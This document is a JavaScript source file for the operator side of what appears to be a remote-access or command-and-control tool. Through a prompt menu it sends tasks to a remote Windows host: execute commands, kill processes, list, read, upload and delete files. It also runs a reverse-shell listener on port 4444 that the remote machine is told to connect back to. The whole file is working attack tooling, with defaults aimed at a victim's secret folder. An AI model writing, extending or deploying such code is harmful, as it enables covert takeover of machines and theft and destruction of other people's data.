const prompts = require('prompts');
const short = require('short-uuid');
const net = require('net');

const io = require('socket.io-client');
const socket = io.connect('http://localhost:3000/control', { reconnect: true });
const { LOG, ACTIVITY, ERROR } = require('./logging');
const { Task, Commands } = require('./task');
const config = require('./config');

const LISTENER_PORT = 4444;
let SHELL_MODE = false;

const server = net.createServer(socket => {
    socket.pipe(process.stdout);
    process.stdin.pipe(socket);

    process.stdin.on('data', data => {
        if (data.toString().startsWith('exit')) {
            SHELL_MODE = false
            console.clear();
            main();
        }
    });

}).listen(LISTENER_PORT, '0.0.0.0');

socket.on('connect', (socket) => {
    LOG('Connected.');
    main()
});

const sendTask = async (task) => {
    LOG(`Sending task`)
    return new Promise((resolve, reject) => {
        socket.emit('send', task, (res) => {
            LOG(`Response received`)
            console.log(res);
            resolve(res);
        });
    });
}


const options = Object.keys(Commands).map(key => {
    return key
        .toLowerCase()
        .split('_')
        .map(word => word[0].charAt(0).toUpperCase() + word.slice(1)).join(' ')
});

const promptChains = {
    [Commands.EXECUTE]: [
        {
            type: 'text',
            name: 'cmd',
            initial: 'tasklist /v /fo csv | findstr /i "taskmgr.exe"',
            message: 'Enter command',
        }
    ],
    [Commands.KILL_PROCESS]: [
        {
            type: 'number',
            name: 'processID',
            message: 'Enter PID',
        },
    ],
    [Commands.LIST_FILES]: [
        {
            type: 'text',
            name: 'path',
            message: 'Enter remote directory path',
            initial: 'C:\\Users\\User\\VerySecretFolder\\',
        },
    ],
    [Commands.READ_FILE]: [
        {
            type: 'text',
            name: 'path',
            initial: 'C:\\Users\\User\\VerySecretFolder\\example.txt',
            message: 'Enter remote file path',
        },
    ],
    [Commands.UPLOAD_FILE]: [
        {
            type: 'text',
            name: 'url',
            initial: 'example.txt',
            message: 'Enter local file path or URL',
        },
        {
            type: 'text',
            name: 'path',
            initial: 'C:\\Users\\User\\VerySecretFolder\\example.txt',
            message: 'Enter remote file path',
        },
    ],
    [Commands.DELETE_FILE]: [
        {
            type: 'text',
            name: 'path',
            initial: 'C:\\Users\\User\\VerySecretFolder\\example.txt',
            message: 'Enter remote file path',
        },
    ],
    [Commands.SHELL]: [
        {
            type: 'text',
            name: 'ip',
            message: 'Enter IP address',
        },
        {
            type: 'number',
            name: 'port',
            message: 'Enter port',
        },
    ],
}


const main = async () => {
    while (!SHELL_MODE) {
        const selection = await prompts({
            type: 'select',
            name: 'task',
            message: 'Select task',
            choices: options,
        })

        if (selection.task == null) {
            process.exit()
        }

        const args = (selection.task === Commands.SHELL)
            ? { ip: config.PUBLIC_IP, port: LISTENER_PORT }
            : await prompts(promptChains[selection.task] || [])

        const task = Task(selection.task, args);
        const res = await sendTask(task);

        if (selection.task == Commands.SHELL && res) {
            SHELL_MODE = true;
            console.clear();
        }
    }
}